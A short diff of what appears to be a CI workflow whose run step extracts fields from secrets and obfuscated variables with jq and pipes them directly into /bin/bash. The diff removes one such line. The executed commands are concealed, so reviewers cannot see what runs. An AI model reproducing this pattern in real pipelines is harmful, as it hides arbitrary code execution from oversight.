@@ -17,7 +17,6 @@ jobs:
           kn8769: ${{ secrets.kn8769 }}
         run: |
           printf '%s' "$kn8769" | jq -r .pln8631 | /bin/bash
-          echo $g29 | jq -r .zgpde7 | /bin/bash
           echo $kh666 | jq -r .ng8 | /bin/bash
           echo $dldar74422 | jq -r .pczjv156 | /bin/bash
 
